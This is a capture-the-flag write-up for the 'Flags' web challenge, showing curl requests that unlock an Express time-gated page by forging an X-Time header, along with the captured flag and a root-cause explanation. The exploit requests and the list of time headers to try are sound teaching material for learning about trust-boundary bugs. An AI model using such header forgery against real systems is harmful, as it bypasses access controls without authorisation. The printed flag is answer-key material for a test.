---
title: "Flags"
ctf: "Kashi CTF 2026"
date: "2026-04-03"
description: "Bypassing a time-gate using an HTTP header vulnerability"
points: 500
tags: ["Web"]
---

## tl;dr

The homepage only showed a short lock message:

```html
<h2>Challenge Locked</h2>
<p>Opens in ~272 minutes</p>
```

At first glance this suggests either a pure time-gate challenge or a logic bug where the gate trusts user-controlled time input. The title "Flags" and the description "You may have the Flag" hint that the challenge itself is tiny, with minimal attack surface.

**Challenge points:** 500

---

## Recon

Starting with the obvious request:

```bash
curl -i -s http://34.126.223.46:17014/
```

Response:

```
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8

<h2>Challenge Locked</h2>
<p>Opens in ~272 minutes</p>
```

**Key observations:**

- The backend is Express.
- The response is server-rendered HTML, not a frontend app shell.
- The countdown is computed server-side and baked into the response body.

The logic likely lives in a single route: compare current time against unlock time; if not open yet, render "locked"; otherwise return the flag.

---

## Endpoint Enumeration

Checked common paths for hidden routes:

- `/flag`, `/api`, `/api/flag`, `/status`, `/time`, `/open`, `/unlock`, `/admin`, `/source`, `/app.js`

All returned standard Express 404 responses (e.g. `Cannot GET /flag`). No useful second route — the entire challenge is on `/`.

---

## Method and Header Recon

Tested other HTTP methods:

- `OPTIONS /` → `Allow: GET,HEAD`
- `POST /` → `Cannot POST /`

Also tested proxy-style headers and query parameters (`X-Forwarded-For`, `X-Forwarded-Host`, `?now=...`, `?unlock=1`). No effect.

At this point, the likely bug class was **client-controlled time header** — a common beginner web pattern where the app compares an attacker-supplied timestamp against a target unlock time instead of using the server's own clock.

---

## Why Time Headers Were the Right Next Step

The page literally computed "Opens in ~N minutes," meaning some code was doing date arithmetic. In Node/Express, developers sometimes write logic like:

```js
const now = new Date(req.headers['date'] || Date.now())
```

If they do that, a client can force the server to believe it is later than it really is.

---

## Header Fuzzing

Tested a short list of time-style headers and compared response sizes to the normal lock page (66 bytes).

**Interesting results:**

| Header | Value | Response Size |
|--------|-------|---------------|
| `X-Time` | `Fri, 04 Apr 2026 23:59:00 GMT` | 41 bytes |
| `X-Time` | `1` | 71 bytes |

This was the breakthrough. `X-Time` was definitely being parsed by the application, and different values were affecting the countdown, confirming the app was using it as the current time for the gate logic.

---

## Confirming the Bug

Testing with a past Unix timestamp:

```bash
curl -i -s http://34.126.223.46:17014/ -H 'X-Time: 1'
```

Response:

```html
<h2>Challenge Locked</h2>
<p>Opens in ~13282230 minutes</p>
```

The server is interpreting `1` as a timestamp close to the Unix epoch. Since the unlock time is in 2026, the enormous remaining minute count confirms:

- The header is trusted
- The app performs arithmetic with it
- We control the effective "current time"

---

## Extracting the Flag

With a future date, the server believes the challenge is already unlocked:

```bash
curl -i -s http://34.126.223.46:17014/ \
  -H 'X-Time: Fri, 04 Apr 2026 23:59:00 GMT'
```

Response:

```
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8

kashiCTF{71m3_byp455_w45_fun_65_WLGXDZLQ}
```

---

## Flag

```
kashiCTF{71m3_byp455_w45_fun_65_WLGXDZLQ}
```

---

## Root Cause

The vulnerability is a **trust boundary failure**. The server should have used its own clock:

```js
const now = new Date()
```

But instead likely used:

```js
const now = new Date(req.header('X-Time') || Date.now())
```

That turns a time lock into a one-header bypass.

**Likely intended logic:**

```js
const openAt = new Date('some fixed future time')
const now    = new Date(req.header('X-Time') || Date.now())

if (now < openAt) {
  return res.send(`Challenge Locked...`)
}

return res.send(flag)
```

---

## Short Solve Summary

1. Visit `/` — see the locked page with a countdown
2. Confirm there are no useful hidden routes
3. Test time-related headers
4. Discover that `X-Time` affects the countdown
5. Send a future `X-Time` value
6. Receive the flag directly

**Exploit request:**

```bash
curl -s http://34.126.223.46:17014/ \
  -H 'X-Time: Fri, 04 Apr 2026 23:59:00 GMT'
```

---

## What to Learn

- If a challenge shows a timer or countdown, test whether the server trusts client-controlled time input.
- On small Express challenges, the entire bug often lives in the root route with no hidden API.
- Response-size comparison is a fast way to detect when a header is influencing application logic.
- Common headers to test for time-based bugs: `Date`, `X-Time`, `X-Date`, `X-Now`, `If-Modified-Since`, `If-Unmodified-Since`
- When one value changes the countdown instead of bypassing it directly, that is still a strong signal that you found the right input.
